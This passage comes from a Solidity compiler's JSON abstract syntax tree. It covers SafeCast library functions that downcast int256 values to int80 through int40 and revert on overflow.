ifier":"t_type$_t_int80_$","typeString":"type(int80)"},"typeName":{"id":5159,"name":"int80","nodeType":"ElementaryTypeName","src":"29246:5:7","typeDescriptions":{}}},"id":5162,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"29246:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int80","typeString":"int80"}},"src":"29233:25:7","typeDescriptions":{"typeIdentifier":"t_int80","typeString":"int80"}},"id":5164,"nodeType":"ExpressionStatement","src":"29233:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5167,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5165,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5156,"src":"29272:10:7","typeDescriptions":{"typeIdentifier":"t_int80","typeString":"int80"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5166,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5153,"src":"29286:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"29272:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5174,"nodeType":"IfStatement","src":"29268:97:7","trueBody":{"id":5173,"nodeType":"Block","src":"29293:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3830","id":5169,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29344:2:7","typeDescriptions":{"typeIdentifier":"t_rational_80_by_1","typeString":"int_const 80"},"value":"80"},{"id":5170,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5153,"src":"29348:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_80_by_1","typeString":"int_const 80"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5168,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"29314:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5171,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"29314:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5172,"nodeType":"RevertStatement","src":"29307:47:7"}]}}]},"documentation":{"id":5151,"nodeType":"StructuredDocumentation","src":"28839:307:7","text":" @dev Returns the downcasted int80 from int256, reverting on\n overflow (when the input is less than smallest int80 or\n greater than largest int80).\n Counterpart to Solidity's `int80` operator.\n Requirements:\n - input must fit into 80 bits"},"id":5176,"implemented":true,"kind":"function","modifiers":[],"name":"toInt80","nameLocation":"29160:7:7","nodeType":"FunctionDefinition","parameters":{"id":5154,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5153,"mutability":"mutable","name":"value","nameLocation":"29175:5:7","nodeType":"VariableDeclaration","scope":5176,"src":"29168:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5152,"name":"int256","nodeType":"ElementaryTypeName","src":"29168:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"29167:14:7"},"returnParameters":{"id":5157,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5156,"mutability":"mutable","name":"downcasted","nameLocation":"29211:10:7","nodeType":"VariableDeclaration","scope":5176,"src":"29205:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int80","typeString":"int80"},"typeName":{"id":5155,"name":"int80","nodeType":"ElementaryTypeName","src":"29205:5:7","typeDescriptions":{"typeIdentifier":"t_int80","typeString":"int80"}},"visibility":"internal"}],"src":"29204:18:7"},"scope":5451,"src":"29151:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5201,"nodeType":"Block","src":"29761:148:7","statements":[{"expression":{"id":5189,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5184,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5182,"src":"29771:10:7","typeDescriptions":{"typeIdentifier":"t_int72","typeString":"int72"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5187,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5179,"src":"29790:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5186,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"29784:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int72_$","typeString":"type(int72)"},"typeName":{"id":5185,"name":"int72","nodeType":"ElementaryTypeName","src":"29784:5:7","typeDescriptions":{}}},"id":5188,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"29784:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int72","typeString":"int72"}},"src":"29771:25:7","typeDescriptions":{"typeIdentifier":"t_int72","typeString":"int72"}},"id":5190,"nodeType":"ExpressionStatement","src":"29771:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5193,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5191,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5182,"src":"29810:10:7","typeDescriptions":{"typeIdentifier":"t_int72","typeString":"int72"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5192,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5179,"src":"29824:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"29810:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5200,"nodeType":"IfStatement","src":"29806:97:7","trueBody":{"id":5199,"nodeType":"Block","src":"29831:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3732","id":5195,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"29882:2:7","typeDescriptions":{"typeIdentifier":"t_rational_72_by_1","typeString":"int_const 72"},"value":"72"},{"id":5196,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5179,"src":"29886:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_72_by_1","typeString":"int_const 72"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5194,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"29852:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5197,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"29852:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5198,"nodeType":"RevertStatement","src":"29845:47:7"}]}}]},"documentation":{"id":5177,"nodeType":"StructuredDocumentation","src":"29377:307:7","text":" @dev Returns the downcasted int72 from int256, reverting on\n overflow (when the input is less than smallest int72 or\n greater than largest int72).\n Counterpart to Solidity's `int72` operator.\n Requirements:\n - input must fit into 72 bits"},"id":5202,"implemented":true,"kind":"function","modifiers":[],"name":"toInt72","nameLocation":"29698:7:7","nodeType":"FunctionDefinition","parameters":{"id":5180,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5179,"mutability":"mutable","name":"value","nameLocation":"29713:5:7","nodeType":"VariableDeclaration","scope":5202,"src":"29706:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5178,"name":"int256","nodeType":"ElementaryTypeName","src":"29706:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"29705:14:7"},"returnParameters":{"id":5183,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5182,"mutability":"mutable","name":"downcasted","nameLocation":"29749:10:7","nodeType":"VariableDeclaration","scope":5202,"src":"29743:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int72","typeString":"int72"},"typeName":{"id":5181,"name":"int72","nodeType":"ElementaryTypeName","src":"29743:5:7","typeDescriptions":{"typeIdentifier":"t_int72","typeString":"int72"}},"visibility":"internal"}],"src":"29742:18:7"},"scope":5451,"src":"29689:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5227,"nodeType":"Block","src":"30299:148:7","statements":[{"expression":{"id":5215,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5210,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5208,"src":"30309:10:7","typeDescriptions":{"typeIdentifier":"t_int64","typeString":"int64"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5213,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5205,"src":"30328:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5212,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"30322:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int64_$","typeString":"type(int64)"},"typeName":{"id":5211,"name":"int64","nodeType":"ElementaryTypeName","src":"30322:5:7","typeDescriptions":{}}},"id":5214,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"30322:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int64","typeString":"int64"}},"src":"30309:25:7","typeDescriptions":{"typeIdentifier":"t_int64","typeString":"int64"}},"id":5216,"nodeType":"ExpressionStatement","src":"30309:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5219,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5217,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5208,"src":"30348:10:7","typeDescriptions":{"typeIdentifier":"t_int64","typeString":"int64"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5218,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5205,"src":"30362:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"30348:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5226,"nodeType":"IfStatement","src":"30344:97:7","trueBody":{"id":5225,"nodeType":"Block","src":"30369:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3634","id":5221,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"30420:2:7","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},{"id":5222,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5205,"src":"30424:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5220,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"30390:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5223,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"30390:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5224,"nodeType":"RevertStatement","src":"30383:47:7"}]}}]},"documentation":{"id":5203,"nodeType":"StructuredDocumentation","src":"29915:307:7","text":" @dev Returns the downcasted int64 from int256, reverting on\n overflow (when the input is less than smallest int64 or\n greater than largest int64).\n Counterpart to Solidity's `int64` operator.\n Requirements:\n - input must fit into 64 bits"},"id":5228,"implemented":true,"kind":"function","modifiers":[],"name":"toInt64","nameLocation":"30236:7:7","nodeType":"FunctionDefinition","parameters":{"id":5206,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5205,"mutability":"mutable","name":"value","nameLocation":"30251:5:7","nodeType":"VariableDeclaration","scope":5228,"src":"30244:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5204,"name":"int256","nodeType":"ElementaryTypeName","src":"30244:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"30243:14:7"},"returnParameters":{"id":5209,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5208,"mutability":"mutable","name":"downcasted","nameLocation":"30287:10:7","nodeType":"VariableDeclaration","scope":5228,"src":"30281:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int64","typeString":"int64"},"typeName":{"id":5207,"name":"int64","nodeType":"ElementaryTypeName","src":"30281:5:7","typeDescriptions":{"typeIdentifier":"t_int64","typeString":"int64"}},"visibility":"internal"}],"src":"30280:18:7"},"scope":5451,"src":"30227:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5253,"nodeType":"Block","src":"30837:148:7","statements":[{"expression":{"id":5241,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5236,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5234,"src":"30847:10:7","typeDescriptions":{"typeIdentifier":"t_int56","typeString":"int56"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5239,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5231,"src":"30866:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5238,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"30860:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int56_$","typeString":"type(int56)"},"typeName":{"id":5237,"name":"int56","nodeType":"ElementaryTypeName","src":"30860:5:7","typeDescriptions":{}}},"id":5240,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"30860:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int56","typeString":"int56"}},"src":"30847:25:7","typeDescriptions":{"typeIdentifier":"t_int56","typeString":"int56"}},"id":5242,"nodeType":"ExpressionStatement","src":"30847:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5245,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5243,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5234,"src":"30886:10:7","typeDescriptions":{"typeIdentifier":"t_int56","typeString":"int56"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5244,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5231,"src":"30900:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"30886:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5252,"nodeType":"IfStatement","src":"30882:97:7","trueBody":{"id":5251,"nodeType":"Block","src":"30907:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3536","id":5247,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"30958:2:7","typeDescriptions":{"typeIdentifier":"t_rational_56_by_1","typeString":"int_const 56"},"value":"56"},{"id":5248,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5231,"src":"30962:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_56_by_1","typeString":"int_const 56"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5246,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"30928:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5249,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"30928:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5250,"nodeType":"RevertStatement","src":"30921:47:7"}]}}]},"documentation":{"id":5229,"nodeType":"StructuredDocumentation","src":"30453:307:7","text":" @dev Returns the downcasted int56 from int256, reverting on\n overflow (when the input is less than smallest int56 or\n greater than largest int56).\n Counterpart to Solidity's `int56` operator.\n Requirements:\n - input must fit into 56 bits"},"id":5254,"implemented":true,"kind":"function","modifiers":[],"name":"toInt56","nameLocation":"30774:7:7","nodeType":"FunctionDefinition","parameters":{"id":5232,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5231,"mutability":"mutable","name":"value","nameLocation":"30789:5:7","nodeType":"VariableDeclaration","scope":5254,"src":"30782:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5230,"name":"int256","nodeType":"ElementaryTypeName","src":"30782:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"30781:14:7"},"returnParameters":{"id":5235,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5234,"mutability":"mutable","name":"downcasted","nameLocation":"30825:10:7","nodeType":"VariableDeclaration","scope":5254,"src":"30819:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int56","typeString":"int56"},"typeName":{"id":5233,"name":"int56","nodeType":"ElementaryTypeName","src":"30819:5:7","typeDescriptions":{"typeIdentifier":"t_int56","typeString":"int56"}},"visibility":"internal"}],"src":"30818:18:7"},"scope":5451,"src":"30765:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5279,"nodeType":"Block","src":"31375:148:7","statements":[{"expression":{"id":5267,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5262,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5260,"src":"31385:10:7","typeDescriptions":{"typeIdentifier":"t_int48","typeString":"int48"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5265,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5257,"src":"31404:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5264,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"31398:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int48_$","typeString":"type(int48)"},"typeName":{"id":5263,"name":"int48","nodeType":"ElementaryTypeName","src":"31398:5:7","typeDescriptions":{}}},"id":5266,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"31398:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int48","typeString":"int48"}},"src":"31385:25:7","typeDescriptions":{"typeIdentifier":"t_int48","typeString":"int48"}},"id":5268,"nodeType":"ExpressionStatement","src":"31385:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5271,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5269,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5260,"src":"31424:10:7","typeDescriptions":{"typeIdentifier":"t_int48","typeString":"int48"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5270,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5257,"src":"31438:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"31424:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5278,"nodeType":"IfStatement","src":"31420:97:7","trueBody":{"id":5277,"nodeType":"Block","src":"31445:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3438","id":5273,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31496:2:7","typeDescriptions":{"typeIdentifier":"t_rational_48_by_1","typeString":"int_const 48"},"value":"48"},{"id":5274,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5257,"src":"31500:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_48_by_1","typeString":"int_const 48"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5272,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"31466:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5275,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"31466:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5276,"nodeType":"RevertStatement","src":"31459:47:7"}]}}]},"documentation":{"id":5255,"nodeType":"StructuredDocumentation","src":"30991:307:7","text":" @dev Returns the downcasted int48 from int256, reverting on\n overflow (when the input is less than smallest int48 or\n greater than largest int48).\n Counterpart to Solidity's `int48` operator.\n Requirements:\n - input must fit into 48 bits"},"id":5280,"implemented":true,"kind":"function","modifiers":[],"name":"toInt48","nameLocation":"31312:7:7","nodeType":"FunctionDefinition","parameters":{"id":5258,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5257,"mutability":"mutable","name":"value","nameLocation":"31327:5:7","nodeType":"VariableDeclaration","scope":5280,"src":"31320:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5256,"name":"int256","nodeType":"ElementaryTypeName","src":"31320:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"31319:14:7"},"returnParameters":{"id":5261,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5260,"mutability":"mutable","name":"downcasted","nameLocation":"31363:10:7","nodeType":"VariableDeclaration","scope":5280,"src":"31357:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int48","typeString":"int48"},"typeName":{"id":5259,"name":"int48","nodeType":"ElementaryTypeName","src":"31357:5:7","typeDescriptions":{"typeIdentifier":"t_int48","typeString":"int48"}},"visibility":"internal"}],"src":"31356:18:7"},"scope":5451,"src":"31303:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5305,"nodeType":"Block","src":"31913:148:7","statements":[{"expression":{"id":5293,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5288,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5286,"src":"31923:10:7","typeDescriptions":{"typeIdentifier":"t_int40","typeString":"int40"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5291,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5283,"src":"31942:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5290,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"31936:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int40_$","typeString":"type(int40)"},"typeName":{"id":5289,"name":"int40","nodeType":"ElementaryTypeName","src":"31936:5:7","typeDescriptions":{}}},"id":5292,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"31936:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int40","typeString":"int40"}},"src":"31923:25:7","typeDescriptions":{"typeIdentifier":"t_int40","typeString":"int40"}},"id":5294,"nodeType":"ExpressionStatement","src":"31923:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5297,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5295,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5286,"src":"31962:10:7","typeDescriptions":{"typeIdentifier":"t_int40","typeString":"int40"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5296,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5283,"src":"31976:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"31962:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5304,"nodeType":"IfStatement","src":"31958:97:7","trueBody":{"id":5303,"nodeType":"Block","src":"31983:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3430","id":5299,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"32034:2:7","typeDescriptions":{"typeIdentifier":"t_rational_40_by_1","typeString":"int_const 40"},"value":"40"},{"id":5300,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5283,"src":"32038:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_40_by_1","typeString":"int_const 40"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5298,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"32004:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5301,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"32004:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5302,"nodeType":"RevertStatement","src":"31997:47:7"}]}}]},"documentation":{"id":5281,"nodeType":"StructuredDocumentation","src":"31529:307:7","text":" @dev Returns the downcasted int40 from int256, reverting on\n overflow (when the input is less than smallest int40 or\n greater than largest int40).\n Counterpart to Solidity's `int40` operator.\n Requirements:\n - input must fit into 40 bits"},"id":5306,"implemented":true,"kind":"function","modifiers":[],"name":"toInt40","nameLocation":"31850:7:7","nodeType":"FunctionDefinition","parameters":{"id":5284,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5283,"mutability":"mutable","name":"value","nameLocation":"31865:5:7","nodeType":"VariableDeclaration","scope":5306,"src":"31858:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5282,"name":"int256","nodeType":"ElementaryTypeName","src":"31858:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"31857:14:7"},"returnParameters":{"id":5287,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5286,"mutability":"mutable","name":"downcasted","nameLocation":"31901:10:7","nodeType":"VariableDeclaration","scope":5306,"src":"31895:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int40","typeString":"int40"},"typeName":{"id":5285,"name":"int40","nodeType":"ElementaryTypeName","src":"31895:5:7","typeDescriptions":{"typeIdentifier":"t_int40","typeString":"int40"}},"visibility":"internal"}],"src":"31894:18:7"},"scope":5451,"src":"31841:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5331,"nodeType":"Block","src":"32451:148:7","statements":[{"expression":{"id":5319,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5314,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5312,"src":"32461:10:7","typeDescriptions":{"typeIdentifier":"t_int32","typeString":"int32"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5317,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5309,"src":"32480:5:7","typeDescriptions":{"typeIdentifier":"t_